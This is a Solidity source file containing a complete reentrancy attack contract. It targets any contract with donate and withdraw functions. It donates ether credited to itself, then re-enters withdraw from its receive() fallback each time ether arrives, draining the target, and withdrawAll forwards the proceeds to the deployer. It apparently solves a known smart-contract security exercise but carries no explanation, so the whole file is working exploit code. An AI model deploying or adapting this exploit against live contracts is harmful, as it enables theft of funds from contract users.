// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface HasWithdraw {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentrancyAttack {

  HasWithdraw public target;
  address public owner;

  constructor(address attackTarget) {
    target = HasWithdraw(attackTarget);
    owner = msg.sender;
  }
  
  function donate() external payable returns (bool result) {
    (result, ) = (address(target)).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
  }

  function trigger(uint _amount) external {
    target.withdraw(_amount);
  }

  function withdrawAll() external {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    target.withdraw(msg.value);
  }
}
